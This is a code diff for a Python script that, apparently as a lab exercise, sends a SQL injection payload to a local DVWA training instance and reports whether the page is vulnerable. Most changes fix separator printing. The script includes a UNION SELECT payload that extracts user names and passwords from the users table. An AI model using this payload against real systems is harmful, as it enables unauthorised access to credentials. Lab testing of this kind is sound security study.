@@ -3,7 +3,7 @@ import requests
 from bs4 import BeautifulSoup as bs
 import helper_url_encode as UrlEncodeHelper
 
-SEPERATOR_PRINT = print("_"*80)
+SEPERATOR = ("_"*80)
 
 BASE_URL = "http://127.0.0.1:80/DVWA"
 
@@ -69,7 +69,7 @@ def main():
         index_page_response = session.get(f"{BASE_URL}/index.php", cookies=cookies_json)
         print(index_page_response.text)
 
-        SEPERATOR_PRINT
+        print(SEPERATOR)
     
         sqli_page = session.get(f"{BASE_URL}/vulnerabilities/sqli/", cookies=cookies_json)
         print(sqli_page.text)
@@ -78,7 +78,8 @@ def main():
         ls_forms = get_forms(sqli_page.text)
         print(ls_forms)
 
-        SEPERATOR_PRINT
+        print(SEPERATOR)
+
 
         sqli_payload = "' UNION SELECT user, password FROM users#" # will return vulnerable
         # sqli_payload = "1" # wont return vulnerable
@@ -86,13 +87,17 @@ def main():
         sqli_res = get_sqli_response(ls_forms[0], sqli_payload, cookies_json)
         print(sqli_res.text)
     
-        SEPERATOR_PRINT
+        print(SEPERATOR)
+
 
         pre_tags = get_pre_tags(sqli_res.text)
-        print(pre_tags)
+        # print(pre_tags)
+        print("pre_tags".upper())
+        [print(item) for item in pre_tags]
         print(len(pre_tags))
 
-        SEPERATOR_PRINT
+        print(SEPERATOR)
+
 
         if does_sqli_succeed(pre_tags):
             print("Your website is vulnerable to SQL Injection attack!")
